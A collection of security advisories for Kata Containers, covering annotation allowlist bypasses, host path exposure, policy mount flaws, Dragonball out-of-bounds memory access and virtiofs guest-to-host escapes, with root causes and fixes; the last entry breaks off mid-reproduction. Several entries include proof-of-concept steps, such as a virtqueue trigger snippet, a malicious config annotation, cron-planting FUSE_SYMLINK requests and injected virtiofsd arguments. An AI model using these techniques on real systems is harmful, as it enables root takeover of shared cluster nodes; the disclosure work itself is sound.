summary: Unintended host and guest changes due to permissive annotation allowlist
description:
Kata-deploy used to configure containerd to forward all Kata pod annotations to the runtime. Pod annotations are provided by the pod author and can override the Kata configuration file, which may not be desired by the cluster owner, and could lead to unintended consequences, including local privilege escalation.

## Detailed description

There are two places where annotations are checked and possibly filtered: the containerd runtime configuration and the Kata configuration. 

The Kata configuration's `enable_annotations` is restrictive by default, but only applies to `io.katacontainers.config.hypervisor` annotations. However, there are other config prefixes, like `io.katacontainers.config.agent` and `io.katacontainers.config.runtime`, which can modify the behaviour on host and in guest and may even pose a security risk.

containerd has a runtime configuration knob for filtering the annotations forwarded to the runtime. `kata-deploy` used  to set `pod_annotations = ["io.katacontainers.*"]`, which forwards all Kata annotations. Thus, most Kata configuration settings can be overridden with annotations in a default setup.

All of this is, by itself, desired behaviour and not necessarily problematic. Issues arise **only** if the following prerequisites are met:

- Kata is installed in the default configuration and containerd's `pod_annotations` are permissive. 
- Untrusted users can schedule pods on the cluster.
- The cluster configuration does not already allow privilege escalation through scheduling pods, for example through: 
  - privileged pods
  - admin capabilities
  - `hostPID=true`
  - hostPath mounts
- The cluster configuration does not inspect Kata annotations added by the untrusted user. 

If these prerequisites are met, the untrusted user can escalate their privileges to root on all nodes that allow scheduling Kata pods.

## Patches and workarounds

https://github.com/kata-containers/kata-containers/pull/13857 changed the kata-deploy defaults to only allow known-safe annotations, and leaves allowing more annotations to the cluster admin. The same can be done manually as a workaround.

## Notes

This vulnerability was independently discovered and reported by

- @r0binak
- @cipher-creator

summary: Untrusted pod annotation bind-mounts any host path into the Kata guest, bypassing the operator allowlist
description:
Hello,

This is a disclosure for a vulnerability in kata-containers that was found by Anthropic using their models and agents. I have reviewed the vulnerability and consider it to be true according to kata-containers's threat model.

## TLDR

The vulnerability is that `update_config_by_annotation` in `src/libs/kata-types/src/annotations/mod.rs` only enforces the operator's annotation allowlist for keys prefixed `io.katacontainers.config.hypervisor.`; every `runtime.*` key is applied unconditionally in an ungated `else` branch. One of those keys, `runtime.sandbox_bind_mounts`, takes a list of host paths and bind-mounts each one into the guest-shared directory. So any tenant who can set pod annotations on a runtime-rs RuntimeClass can have arbitrary host paths (e.g. `/var/lib/kubelet`, `/etc`) exposed read-only into the untrusted guest's shared filesystem — with no operator opt-in. This breaks Kata's guarantee that the host filesystem is not exposed to the guest beyond what the runtime deliberately shares, and puts sensitive host files (such as kubelet credentials) within reach of the untrusted guest. The root cause is the `KATA_ANNO_CFG_SANDBOX_BIND_MOUNTS` arm sitting inside the ungated `else` branch at lines 1042–1165 of that file.

## Root cause analysis

The dispatch loop gates hypervisor keys behind the allowlist, but routes everything else into an `else` branch that applies keys with no allowlist check at all.

https://github.com/kata-containers/kata-containers/blob/af212219b81a5ec1f5989f025f73393dbb1fc551/src/libs/kata-types/src/annotations/mod.rs#L546-L1165

The gate `is_annotation_enabled` returns `false` for anything that does not start with the hypervisor prefix, which sends `io.katacontainers.config.runtime.sandbox_bind_mounts` straight into the `else` branch:

https://github.com/kata-containers/kata-containers/blob/af212219b81a5ec1f5989f025f73393dbb1fc551/src/libs/kata-types/src/config/hypervisor/mod.rs#L1448-L1458

```rust
pub fn is_annotation_enabled(&self, path: &str) -> bool {
    if !path.starts_with(KATA_ANNO_CFG_HYPERVISOR_PREFIX) { // "io.katacontainers.config.hypervisor."
        return false;                                        // runtime.* / agent.* => false
    }
    // ... regex allowlist match for hypervisor keys only
}
```

The `else` branch's name is misleading: keys explicitly matched there (like `sandbox_bind_mounts`) are applied; only unrecognised keys reach the `warn!`. The effect is that the allowlist's "operator must opt in" semantics silently do not apply to any `runtime.*` key. The only downstream validation is an existence check that imposes no restriction on which host paths are allowed — anything that exists on the host is accepted.

Because this sink is very internal, here is how attacker-controlled data reaches it:

1. A tenant sets `io.katacontainers.config.runtime.sandbox_bind_mounts` in their pod spec; containerd forwards `io.katacontainers.*` annotations to the shim (the kata-deploy default).
2. The shim reads the pod's annotations and passes them to config loading — `spec.annotations()` into `load_config` ([manager.rs:301-302](https://github.com/kata-containers/kata-containers/blob/af212219b81a5ec1f5989f025f73393dbb1fc551/src/runtime-rs/crates/runtimes/src/manager.rs#L301-L302)).
3. `load_config` calls `update_config_by_annotation(&mut toml_config)` ([manager.rs:855](https://github.com/kata-containers/kata-containers/blob/af212219b81a5ec1f5989f025f73393dbb1fc551/src/runtime-rs/crates/runtimes/src/manager.rs#L855)).
4. The key is not allowlisted, so it is applied in the ungated `else` branch, appending the raw host paths to `config.runtime.sandbox_bind_mounts` ([annotations/mod.rs:1156-1165](https://github.com/kata-containers/kata-containers/blob/af212219b81a5ec1f5989f025f73393dbb1fc551/src/libs/kata-types/src/annotations/mod.rs#L1156-L1165)).
5. The only check applied is `canonicalize()`, which merely confirms the path exists ([runtime.rs:242-255](https://github.com/kata-containers/kata-containers/blob/af212219b81a5ec1f5989f025f73393dbb1fc551/src/libs/kata-types/src/config/runtime.rs#L242-L255)).
6. `handle_sandbox_bindmounts` reads that list and calls `setup_sandbox_bind_mounts` ([manager_inner.rs:945-954](https://github.com/kata-containers/kata-containers/blob/af212219b81a5ec1f5989f025f73393dbb1fc551/src/runtime-rs/crates/resource/src/manager_inner.rs#L945-L954)).
7. Each path is bind-mounted into `/run/kata-containers/shared/sandboxes/<sid>/rw/passthrough/sandbox-mounts/`, inside the virtiofsd-exported root, via `bind_mount_unchecked` ([sandbox_bind_mounts.rs:105](https://github.com/kata-containers/kata-containers/blob/af212219b81a5ec1f5989f025f73393dbb1fc551/src/runtime-rs/crates/resource/src/share_fs/sandbox_bind_mounts.rs#L105)).
8. The host path is then present in the guest's shared filesystem at `/run/kata-containers/shared/containers/sandbox-mounts/<basename>` (this is the feature's documented behavior for operator-configured mounts), so a chosen host subtree — for example `/var/lib/kubelet`, which holds kubelet credentials and projected service-account tokens — is placed inside the untrusted guest.

The mount is created read-only (`bind_mount_unchecked(..., true, ...)`), so this is a host→guest read exposure, not a write-back-to-host primitive. What is demonstrated is that an untrusted workload annotation causes an arbitrary host path to be exported into the guest-shared tree with no operator opt-in; the onward consequence — a guest that reads exposed node credentials and uses them for node/cluster-credential theft — follows from exposing sensitive paths this way but is not itself exercised here. This affects runtime-rs only; the Go runtime does not honor a `sandbox_bind_mounts` annotation.

## Suggested fix

Do not honor host bind-mount paths from workload annotations — these are operator-controlled configuration only. In the `else` branch, replace the `KATA_ANNO_CFG_SANDBOX_BIND_MOUNTS` arm so it refuses the annotation instead of applying it:

```rust
KATA_ANNO_CFG_SANDBOX_BIND_MOUNTS => {
    // Host bind-mount paths are operator-controlled configuration only.
    // Never honor them from untrusted workload annotations.
    warn!(sl!(), "Annotation {} is not permitted from workload annotations", key);
}
```

The broader, preferred fix is to extend the allowlist mechanism so it gates every annotation that affects host-side state, not only `hypervisor.`-prefixed keys — apply an `is_annotation_enabled`-style check to `runtime.*`/`agent.*` keys, with host-path-bearing keys excluded by default.

## Attribution
Please attribute Anthropic and Ada Logics. This issue was found by Anthropic by using agents to study security of open source projects, and I have helped validate the found issue, create the report and communicate it to you.

## Disclosure
This report follows a 90-day coordinated disclosure deadline. I'm happy to coordinate on the exact timing and to provide any further detail you need.

summary: generated policy allows mounting attacker-chosen guest paths to specific locations
description:
### Impact

This vulnerability only applies to Kata configurations that use genpolicy to protect the guest from the host, i.e. Confidential Containers. Kata sandboxing is not affected.

A malicious operator can craft `CreateContainer` requests that result in arbitrary guest rootfs paths mounted to the following locations:

   * /etc/hostname
   * /etc/hosts
   * /etc/resolv.conf
   * /var/run/secrets/azure/tokens
   * /var/run/secrets/kubernetes.io/serviceaccount
   * any volumeMount mentioned in the container spec

These paths contain host-provided data and are not subject to `genpolicy` integrity checks, so the containerized application should already treat them with care. There is a risk, however, that the application assumes these paths to contain non-sensitive information which can be shared with the untrusted environment, but the attacker mounted a sensitive file there.

Furthermore, the attacker can provision arbitrary content (both guest paths and arbitrary host-provided content) in the following locations:

  * /dev/shm
  * /dev/termination-log

An application that expects the contents of these directories to be secret, or exclusively guest-provided, might risk confidentiality and integrity in various ways.

### Patches

This vulnerability is patched in Kata 4.1.0. There is no patch release for this issue.

### Workarounds

As a workaround, use the `rules.rego` file from 4.1.0 or apply the patch manually:

```patch
commit 788e2df4f4a332b2675317363ba1d2803c591d8b
Author: Markus Rudy <mr@edgeless.systems>
Date:   Thu Jul 23 18:26:47 2026 +0200

    genpolicy: don't match image pull storages to mounts
    
    Signed-off-by: Markus Rudy <mr@edgeless.systems>

diff --git a/src/tools/genpolicy/rules.rego b/src/tools/genpolicy/rules.rego
index c44c513923..58af8b254d 100644
--- a/src/tools/genpolicy/rules.rego
+++ b/src/tools/genpolicy/rules.rego
@@ -1113,6 +1113,8 @@ allow_mount(p_oci, i_mount, i_storages, bundle_id, sandbox_id):= p_index if {
     some p_index, p_mount in p_oci.Mounts
 
     print("allow_mount 1: p_mount =", p_mount)
+    # check_mount expects a regex in the source field, other p_mounts are not eligible for this rule.
+    p_mount.source != ""
     check_mount(p_mount, i_mount, bundle_id, sandbox_id)
 
     print("allow_mount 1: true, p_index =", p_index)
@@ -1126,10 +1128,14 @@ allow_mount(p_oci, i_mount, i_storages, bundle_id, sandbox_id):= p_index if {
     p_mount.destination == i_mount.destination
     p_mount.type_ == i_mount.type_
     p_mount.options == i_mount.options
+    # This rule is exclusively for block-based emptyDir mounts, which don't have a source.
+    p_mount.source == ""
 
     some i_storage in i_storages
     print("allow_mount 2: i_storage =", i_storage)
 
+    # Only block storage is a legitimate mount source for this rule.
+    i_storage.driver in {"blk", "scsi"}
     i_storage.mount_point == i_mount.source
 
     print("allow_mount 2: true, p_index =", p_index)
@@ -1259,13 +1265,21 @@ allow_storage(p_storages, i_storage, bundle_id, sandbox_id) if {
     print("allow_storage: true")
 }
 allow_storage(p_storages, i_storage, bundle_id, sandbox_id) if {
-    i_storage.driver == "image_guest_pull"
     print("allow_storage with image_guest_pull: start")
+    i_storage.driver == "image_guest_pull"
     i_storage.fstype == "overlay"
     i_storage.fs_group == null
     i_storage.shared == false
     count(i_storage.options) == 0
-    # TODO: Check Mount Point, Source, Driver Options, etc.
+
+    # image_guest_pull storages always target the rootfs path directly.
+    expect_root_path := replace(policy_data.common.root_path, "$(bundle-id)", bundle_id)
+    print("allow_storage with image_guest_pull: expect_root_path =", expect_root_path)
+    expect_root_path == i_storage.mount_point
+
+    # TODO: missing validation for fields:
+    #   - driver_options
+    #   - source
     print("allow_storage with image_guest_pull: true")
 }
 allow_storage(p_storages, i_storage, bundle_id, sandbox_id) if {
``` 

### References

Thanks to @AdamKorcz from [Ada Logics](https://adalogics.com/) for finding and responsibly disclosing this issue.

summary: Dragonball: missing length validation in virtio-blk allows guest-to-host VM escape
description:
### Summary
A missing bounds check in Dragonball's virtio-blk device emulation allows a compromised guest kernel to make the host `containerd-shim-kata-v2` process (root) submit `io_uring` read/write operations against its own memory outside the guest-RAM mapping. This yields guest-controlled out-of-bounds read and write in the host shim, leading to guest-to-host VM escape with code execution as root on the node.

### Details
`process_aio_request()` translates each guest data descriptor's address with `GuestMemory::get_host_address()`, which validates only the first byte, and then passes the unchanged guest-supplied length to the host kernel as a raw `iovec`:

https://github.com/kata-containers/kata-containers/blob/ffcc42d984ddc3aa27df54c562a91050e93bef04/src/dragonball/dbs_virtio_devices/src/block/handler.rs#L252-L267

The iovec is then handed straight to `io_uring`:

https://github.com/kata-containers/kata-containers/blob/ffcc42d984ddc3aa27df54c562a91050e93bef04/src/dragonball/dbs_virtio_devices/src/block/ufile/io_uring.rs#L100-L114

The `// Safe because … relied on vm-memory to provide the buffer address` comment is incorrect because `vm-memory` was never asked to validate the length. `Request::check_request()` only enforces `len ≤ 0x100000` and `Request::check_capacity()` only checks against disk size. Neither bounds-checks the descriptor against guest memory. Guest RAM is mapped via plain `MmapRegion::build()` with no surrounding `PROT_NONE` guard pages, so the bytes immediately after the mapping are live shim memory (thread stacks, heap arenas):

https://github.com/kata-containers/kata-containers/blob/ffcc42d984ddc3aa27df54c562a91050e93bef04/src/dragonball/src/address_space_manager.rs#L572

The Linux-AIO backend (`aio.rs`) has the identical flaw.

With `addr` = last page of guest RAM and `len = 0x100000`:
* `T_OUT`: leaks ~1 MiB of adjacent shim memory to disk (defeats ASLR);
* `T_IN`: writes ~1 MiB of attacker-staged disk content into adjacent shim memory.

Dragonball runs as a thread inside the host shim, which means memory corruption in dragonball is memory corruption in a host-root process, there is no further privilege boundary to cross:

https://github.com/kata-containers/kata-containers/blob/ffcc42d984ddc3aa27df54c562a91050e93bef04/src/runtime-rs/crates/hypervisor/src/dragonball/vmm_instance.rs#L136-L152

### PoC
Configuration: `runtime-rs` + `hypervisor = "dragonball"` (default for runtime-rs), `image =` set (default) so the guest rootfs virtio-blk device is attached. No host-side binary or configuration changes.

Entry point: the attacker must be able to write a raw descriptor into the virtio-blk virtqueue (guest ring-0). Some kata-shipped guest kernels expose this directly to guest userspace root (detailed below).

Guest side:
```c
static struct virtio_blk_outhdr hdr = { .type = VIRTIO_BLK_T_IN, .sector = 0 };
struct scatterlist h, d, s, *sgs[3] = { &h, &d, &s };

sg_init_one(&h, &hdr, sizeof(hdr));
/* THE TRIGGER: addr = last 4 KiB page of guest RAM; len = 1 MiB → 1020 KiB past it. */
sg_set_page(&d, virt_to_page(phys_to_virt(tail_gpa)), 0x100000, 0);
sg_init_one(&s, &status, 1);

/* hdr OUT, data+status IN → VIRTIO_BLK_T_IN: host preadv()s disk → OOB iovec */
virtqueue_add_sgs(vq, sgs, 1, 2, &hdr, GFP_KERNEL);
virtqueue_kick(vq);
```

Dragonball processes this at `handler.rs:252-267` and submits the resulting `{hva, 0x100000}` iovec at `io_uring.rs:104`.

Live capture (3.32.0; guest kernel = Kata's `build-kernel.sh -g nvidia` build, unmodified; bpftrace `kprobe:io_prep_rw` on the shim PID):
```
shim PID 126521  guest-RAM mmap [0x7d6d7abf1000, 0x7d6dfabf1000)
[guest] uname -r → 6.18.35-nvidia-gpu
[guest] insmod /exploit-min.ko tail_gpa=0x7ffff000

IOVEC base=0x7d6dfabf0000 len=0x100000

*** OOB: iovec [0x7d6dfabf0000,0x7d6dfacf0000) extends 0xff000 bytes
    past guest mmap [0x7d6d7abf1000,0x7d6dfabf1000) ***

Host-shim VMAs the OOB iovec spans (/proc/<shim>/maps):
    7d6dfabf1000-7d6dfabf3000 ---p 00000000 00:00 0   ← 8 KiB stack guard (not a guest-RAM guard)
    7d6dfabf3000-7d6dfadf4000 rw-p 00000000 00:00 0   ← shim thread stack
```

### Impact
CWE-787 / CWE-125 / CWE-119. Guest-to-host out-of-bounds read and write in the root-privileged `containerd-shim-kata-v2` process, leading to arbitrary code execution as root on the host node. In a multi-tenant Kubernetes cluster this compromises every workload on the node.

Entry point is raw virtqueue access (guest ring-0) which is the standard VMM threat model. Reachability from guest userspace root, by Kata guest kernel:

| Guest kernel | guest root → ring-0 |
|---|---|
| `kernel-nvidia-gpu` (x86_64/arm64) | Direct through `CONFIG_MODULES=y`, `MODULE_SIG_FORCE` unset |
| Stock x86_64/arm64 (`kata-dragonball` runtime class) | Would require a chained guest-kernel exploit because `CONFIG_MODULES=n` and `CONFIG_DEVMEM=n`. |

Affected: kata-containers 3.0.0, `runtime-rs` with `hypervisor = "dragonball"`

### Report history

This vulnerability was independently discovered and reported by 

- @JulesDT 
- @EaEa0001
- @omkhar

The above report is by @JulesDT.

summary: dragonball: guest-to-host escape through out-of-bounds memory access in several virtio drivers
description:
The dragonball VMM lacked size checks which allowed a malicious guest to overwrite host memory, potentially leading to a full guest-to-host escape.

## Detailed description

A privileged process inside the Kata guest VM could cause the Dragonball hypervisor to overwrite its own process memory, causing at least a crash but possibly also remote code execution. Since the Kata runtime usually runs as root, this would constitute a full host takeover. This attack has very concrete prerequisites which limit the potential impact.

The vulnerability affects hosts that are using Kata to protect themselves from malicious guests. Confidential containers are not affected beyond that.

The vulnerability resided in the Dragonball implementation of several virtio drivers, and is thus limited to runtime-rs with Dragonball hypervisor.

## Patches and workarounds

This is fixed with https://github.com/kata-containers/kata-containers/pull/13661, by adding size checks to all affected code locations. The first release to contain the patch is `4.3.0`.

There is no workaround for this issue, besides not running untrusted guests. 

## Notes

This vulnerability was independently discovered and reported by

- @omkhar
- @silentEAG and @winmin
- @arpitjain099
- @JulesDT
- @AdamKorcz from Ada Logics
- @ataberk-xyz
- @0xSemizzz
- @Many11225

summary: kata-agent mem-agent ttRPC methods are not subject to agent-policy enforcement, letting an untrusted host tamper with confidential-guest memory management
description:
## Summary
In Confidential Containers (CoCo) deployments, the kata-agent enforces an OPA/Rego-based AgentPolicy that must authorize every ttRPC API call before it executes — this policy is the security boundary preventing an untrusted host from directing the confidential guest. Two ttRPC methods introduced with the mem-agent feature are missing this authorization check, meaning an untrusted host can invoke them unconditionally regardless of the guest's policy configuration. When mem-agent is enabled (off by default), this allows the host to tamper with in-guest memory management — forcing swap, aggressive eviction, or compaction — causing attacker-controlled availability and performance degradation of the confidential workload, outside the policy boundary that is supposed to govern every agent API call.

## Impact
When the mem-agent is enabled (agent.mem_agent_enable=1, which is off by default), an unauthenticated call from the host can reconfigure in-guest memory management: disabling memory reclaim or compaction, forcing aggressive swap and eviction under attacker-chosen thresholds, or scheduling repeated compaction passes. The practical effect is attacker-controlled availability and performance degradation of the confidential workload, performed entirely outside the agent-policy boundary.

The impact does not include memory disclosure or code execution. Severity is bounded by the precondition that mem-agent must be explicitly enabled.

## Remediation
Add the missing authorization check to the affected ttRPC handlers, and add corresponding default-deny entries for these methods to the genpolicy rules and shipped reference policies. As a defense-in-depth measure, a CI check that verifies every RPC declared in the agent protocol has both a policy gate in the handler and a default rule in the policy file would prevent the same class of omission in the future.

Credit: 5ud0 / Tarmo Technologies.

summary: Config Path Annotation Arbitrary File Loading
description:
## Classification

| CWE | CVSS Score | Severity | Type |
|-----|-----------|----------|------|
| CWE-20 | 9.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N) | CRITICAL | Improper Input Validation |

## 1. Description

### Summary

The kata-runtime's `load_config` function retrieves the configuration file path from pod annotations (`io.katacontainers.config_path`) without validation, allowing a pod user to specify an arbitrary TOML configuration file on the host, leading to host-level RCE.

### Root Cause

- File: `src/runtime-rs/crates/runtimes/src/manager.rs:232`
- Function: `load_config`

The function reads the sandbox config path from pod annotations:

```rust
let config_path = if let Some(path) = annotation.get_sandbox_config_path() {
    path
} else if let Ok(path) = std::env::var(KATA_CONF_FILE) {
    // ...
};
let (mut toml_config, _) = TomlConfig::load_from_file(&config_path)?;
```

This path is used without any validation or restriction. The TOML config controls critical settings including `hypervisor.path` (the hypervisor binary path) and `virtio_fs_daemon` (the virtio-fs daemon path). By overriding these to point to an attacker-controlled binary, the pod user achieves arbitrary code execution as root on the host when the sandbox starts.

### Attack Vector

- Preconditions: Pod user can set annotations (standard Kubernetes capability for most users)
- Entry point: Pod creation with `io.katacontainers.config_path` annotation
- Target: Host system (kata-runtime runs as root)

## 2. Proof of Concept

### Reproduction Steps

1. Write a malicious TOML config to a known path on the host (e.g., via shared filesystem or volume mount):

```toml
[hypervisor.qemu]
path = "/tmp/malicious-binary"
```

2. Create a pod with annotation:
```yaml
metadata:
  annotations:
    io.katacontainers.config_path: "/shared/malicious.toml"
```

3. When the shim starts, it loads the malicious config and executes `/tmp/malicious-binary` as root.

## 3. Impact

### Real-World Attack Scenario

1. A developer has access to a shared volume mount on a multi-tenant Kubernetes cluster
2. Developer writes a malicious TOML config to the shared volume
3. Developer creates a pod with the annotation pointing to the malicious config
4. kata-runtime loads the config and executes the attacker's binary as root
5. Attacker compromises the entire host node

### Affected Component/Users

| Component | Impact |
|-----------|--------|
| kata-runtime-rs | All deployments using Rust runtime |
| Multi-tenant clusters | Highest risk |

### Likelihood Assessment

| Factor | Rating | Reason |
|--------|--------|--------|
| Exploitability | Medium | Requires access to host filesystem path |
| Prevalence | Medium | Rust runtime deployments |
| Detectability | Easy | Annotation visible in pod spec |
| Overall | CRITICAL | Host-level compromise if exploitable |

## 4. Remediation

### Recommended Fix

Disallow the `io.katacontainers.config_path` annotation by default, or strictly validate the provided path against a whitelist of safe directories:

```rust
fn validate_config_path(path: &str) -> Result<()> {
    let allowed_prefixes = ["/etc/kata-containers/", "/opt/kata/"];
    if !allowed_prefixes.iter().any(|p| path.starts_with(p)) {
        return Err(anyhow!("Config path not allowed: {}", path));
    }
    Ok(())
}
```

### Workarounds

Use an admission webhook to reject pods with the `io.katacontainers.config_path` annotation.

### Verification of Fix

Create a pod with `io.katacontainers.config_path: "/tmp/malicious.toml"` — the runtime must reject the config.

summary: runtime-rs: Guest-root to host-root escape via virtiofs
description:
### Summary

In the runtime-rs standalone virtio-fs path, verified here with QEMU (and verified with Cloud Hypervisor too), Kata Containers runs host `virtiofsd` as root with:

```
--sandbox none --seccomp none
```

If an attacker has root-equivalent execution inside the Kata guest VM, they can send raw FUSE requests directly to the host `virtiofsd`. With the tested runtime-rs virtio-fs configuration, a raw `FUSE_SYMLINK` request whose new symlink name is an absolute host path is honored outside the virtio-fs shared directory.

This lets guest root create host-root owned symlinks in sensitive host paths. The PoC created here will create symlinks in the host `/etc/cron.d` directory, causing host cron to execute a guest-controlled payload as host root.

Impact: guest root can execute code as host root.

### Affected configuration

The verified host used:

```
/opt/kata/share/defaults/kata-containers/runtime-rs/configuration-qemu-runtime-rs.toml

rootless = false
shared_fs = "virtio-fs"
virtio_fs_daemon = "/opt/kata/libexec/virtiofsd"
hypervisor_name = "qemu"
debug_console_enabled = false
```

Pinned upstream references, using Kata Containers `main` commit `2ffd1538a296cff93a357bfba0dfca747480a1f8`:

- runtime-rs standalone virtio-fs adds [`--sandbox none --seccomp none`](https://github.com/kata-containers/kata-containers/blob/2ffd1538a296cff93a357bfba0dfca747480a1f8/src/runtime-rs/crates/resource/src/share_fs/share_virtio_fs_standalone.rs#L82-L92) to the `virtiofsd` command line.
- runtime-rs QEMU leaves rootless mode disabled by default: [`rootless = false`](https://github.com/kata-containers/kata-containers/blob/2ffd1538a296cff93a357bfba0dfca747480a1f8/src/runtime-rs/config/configuration-qemu-runtime-rs.toml.in#L31-L34).
- The QEMU runtime-rs config template generates an installed config that uses standalone virtio-fs and points runtime-rs at the host `virtiofsd` binary: [`shared_fs` and `virtio_fs_daemon`](https://github.com/kata-containers/kata-containers/blob/2ffd1538a296cff93a357bfba0dfca747480a1f8/src/runtime-rs/config/configuration-qemu-runtime-rs.toml.in#L164-L171).
- The runtime-rs Makefile resolves those placeholders to [`virtio-fs`](https://github.com/kata-containers/kata-containers/blob/2ffd1538a296cff93a357bfba0dfca747480a1f8/src/runtime-rs/Makefile#L496-L499) and [`$(LIBEXECDIR)/virtiofsd`](https://github.com/kata-containers/kata-containers/blob/2ffd1538a296cff93a357bfba0dfca747480a1f8/src/runtime-rs/Makefile#L184-L190).
- runtime-rs selects the same standalone virtio-fs implementation whenever `shared_fs = "virtio-fs"`: [`ShareVirtioFsStandalone`](https://github.com/kata-containers/kata-containers/blob/2ffd1538a296cff93a357bfba0dfca747480a1f8/src/runtime-rs/crates/resource/src/share_fs/mod.rs#L158-L167).

### Details

The guest kernel normally owns the virtio-fs client. A normal guest process will use filesystem syscalls, and the guest kernel will validate the paths, and only then does the kernel send FUSE messages to the host backend.

An attacker with root-equivalent access inside the guest can bypass that guest virtio-fs client. They can access the virtio-fs PCI device, mmap the virtio PCI BAR, recover guest physical addresses from `/proc/self/pagemap`, and build their own virtqueue from userspace. That queue can submit attacker-built FUSE messages directly to host `virtiofsd`.

The relevant primitive is `FUSE_SYMLINK`. An attacker can send a request whose body contains:

```
new symlink name: /etc/cron.d/kata-go-escape-cron-<pid>
symlink target: /proc/<pid>/root/run/kata-containers/shared/sandboxes/<sid>/ro/passthrough/<sid>/rootfs/tmp/kata-go-escape-payload
```

The new symlink name is an absolute host path. `virtiofsd` should reject that request or force it to resolve below the configured `--shared-dir`. In the tested runtime-rs path, host-root unsandboxed `virtiofsd` accepts the absolute name, creating a real host symlink under `/etc/cron.d`.

The attacker can make the symlink target resolve through `/proc/<pid>/root/...` for a live Kata runtime process whose mount namespace can see the guest-created payload. One matching runtime PID is enough.

When the host cron reads `/etc/cron.d`, it follows the root-owned symlink, loads the guest-created crontab payload, and executes it as host root.

### PoC

```shell
sudo timeout --foreground --kill-after=10s 600s ctr run --rm \
  --runtime /opt/kata/runtime-rs/bin/containerd-shim-kata-v2 \
  --runtime-config-path /opt/kata/share/defaults/kata-containers/runtime-rs/configuration-qemu-runtime-rs.toml \
  --privileged \
  --privileged-without-host-devices \
  docker.io/library/kata-go-escape:local \
  "$run_id"
```

The container is privileged only to model the post-escape condition where the attacker already has guest-root capabilities. It is not the vulnerability by itself.

Inside the guest, the PoC:

1. Writes a cron payload to guest `/tmp/kata-go-escape-payload`.
2. Finds the virtio-fs PCI device in guest /sys.
3. Takes over a virtio-fs queue from userspace.
4. Sends `FUSE_INIT`.
5. Discovers the current runtime-rs sandbox under `passthrough/`.
6. Looks up `passthrough/<sid>/rootfs/tmp/kata-go-escape-payload`.
7. Sends raw `FUSE_SYMLINK` requests where the new symlink names are absolute host paths under `/etc/cron.d`.
8. Keeps the guest alive while host cron scans.

Example log lines:

```
[guest] virtio-fs PCI device: /sys/devices/pci0000:00/0000:00:05.0
[res] sandbox_id=kata-go-escape-test-1778522686-1539
[res] lookup_path_error=0 path=passthrough/kata-go-escape-test-1778522686-1539/rootfs/tmp/kata-go-escape-payload nodeid=21
[spray] pid=1 err=-2 created_candidates=1
```

`err=-2` is expected for the symlink spray. `virtiofsd` can return `ENOENT` after the side effect because its follow-up lookup is still relative to the export root. The host symlink creation has already happened.

### Impact

The PoC proves guest-root to host-root command execution.

Verified host proof:

```
/run/kata-go-escape.proof

uid=0(root) gid=0(root) groups=0(root)
Mon May 11 18:05:01 UTC 2026
```

The proof file is written in host `/run` by host cron. It is not written by the guest process and not written by `virtiofsd`.

An attacker who reaches guest root can therefore cross the Kata isolation boundary and execute commands as host root on affected runtime-rs virtio-fs deployments.

summary: VM Escape via virtiofsd Argument Injection through Default-Enabled Pod Annotations
description:
## Summary

Kata Containers ships with a default configuration that allows pod creators to inject arbitrary command-line arguments into the virtiofsd process through the `io.katacontainers.config.hypervisor.virtio_fs_extra_args` pod annotation. By injecting `-o source=/` along with `--no-announce-submounts` and `--sandbox=none`, an attacker can override the virtiofsd shared directory to serve the entire host root filesystem into the guest VM. Combined with the `kernel_params` annotation (also enabled by default) to activate the agent debug console, the attacker can mount the host filesystem from inside the VM and read or write any file on the host, including /etc/shadow.

## Details

The default Kata configuration at configuration.toml line 1 contains:

```
enable_annotations = ["enable_iommu", "virtio_fs_extra_args", "kernel_params", "kernel_verity_params"]
```

Both `virtio_fs_extra_args` and `kernel_params` are enabled out of the box. The annotation name is checked against this allowlist, but the annotation value (the actual arguments) is never validated or filtered.

In utils.go at line 981, the runtime parses the annotation value as a JSON string array and appends it directly to the virtiofsd arguments:

```go
if value, ok := ocispec.Annotations[vcAnnotations.VirtioFSExtraArgs]; ok {
    var parsedValue []string
    err := json.Unmarshal([]byte(value), &parsedValue)
    // ...
    sbConfig.HypervisorConfig.VirtioFSExtraArgs = append(
        sbConfig.HypervisorConfig.VirtioFSExtraArgs, parsedValue...)
}
```

In virtiofsd.go at line 183-198, the runtime builds the virtiofsd command line with `--shared-dir=<kata_managed_path>` first, then appends the extra args:

```go
args := []string{
    "--syslog",
    "--cache=" + v.cache,
    "--shared-dir=" + v.sourcePath,
    fmt.Sprintf("--fd=%v", FdSocketNumber),
}
if len(v.extraArgs) != 0 {
    args = append(args, v.extraArgs...)
}
```

The virtiofsd binary (Rust, from gitlab.com/virtio-fs/virtiofsd) supports a compatibility option `-o source=PATH` that overrides the `--shared-dir` value. This is processed after clap argument parsing, in the `parse_compat()` function at main.rs:462:

```rust
["source", value] => opt.shared_dir = Some(value.to_string()),
```

Because `-o source=/` is appended after `--shared-dir=<kata_path>`, it overrides the shared directory to `/`. The virtiofsd process then serves the entire host root filesystem through the virtio-fs device.

Additionally, virtiofsd's `--announce-submounts` flag (set by default) causes the guest kernel to create FUSE automounts for bind mounts within the shared directory. When the shared directory is `/`, this produces automounts that shadow the root directory listing. Injecting `--no-announce-submounts` disables this behavior and exposes the true host root directory contents through the kataShared virtiofs mount.

The `kernel_params` annotation is used to inject `agent.debug_console agent.debug_console_vport=1026` into the VM kernel command line. This enables a root shell inside the VM through the kata-runtime exec command. From this shell, the attacker mounts the kataShared virtiofs filesystem and accesses host files directly.

## Rootfs bridge (PoC artifact, not a real constraint)

When virtiofsd uses `-o source=/` to serve the host root, the Kata agent looks for the container rootfs at `/<container-id>/rootfs` relative to the virtiofs root. The PoC pre-creates this directory on the host to keep the demonstration self-contained with ctr.

In a real Kubernetes attack, there are several ways to satisfy this without hostPath volumes. An initContainer that runs before the target container can create the directory. Alternatively, the attacker can set up a second pod that writes to a shared persistent volume mounted on the host. The rootfs bridge is a PoC convenience, not a limitation of the vulnerability itself.

## Impact

An attacker who can create pods on a Kubernetes cluster using Kata Containers with default configuration can:

- Read any file on the host, including /etc/shadow, SSH private keys, and service credentials
- Write to any file on the host, enabling persistent backdoors, cron jobs, or binary replacement
- Access other containers' data through the host filesystem
- Compromise the Kubernetes control plane if it runs on the same host

## Steps to reproduce

Tested on a bare metal server (AMD Ryzen 5 3600, Ubuntu 24.04, kernel 6.8.0-100-generic) with Kata Containers 3.28.0 installed from the official release tarball.

1. Install Kata Containers 3.28.0 and configure containerd. Verify that the default configuration has virtio_fs_extra_args in enable_annotations.

2. Pull a container image:

```
ctr image pull docker.io/library/alpine:latest
```

3. Run the PoC script below, or follow the manual steps:

Manual steps:

